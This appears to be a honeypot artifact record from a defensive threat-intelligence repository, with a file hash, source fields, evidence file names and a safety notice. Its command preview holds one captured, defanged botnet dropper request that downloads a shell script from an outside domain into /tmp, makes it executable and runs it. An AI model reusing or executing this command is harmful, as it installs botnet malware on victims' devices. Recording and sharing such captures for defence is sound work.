# 52a5a11eb588b4172e5ee9b1265e89641db42bc1065e0c9e08cc4ab6ae366e4a

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `52a5a11eb588b4172e5ee9b1265e89641db42bc1065e0c9e08cc4ab6ae366e4a` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
GET /shell?cd+/tmp;rm+-rf+kla.sh;wget+hxxp://aibotnet[.]su/bins/kla.sh;chmod+777+kla.sh;./kla.sh HTTP/1[.]1
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
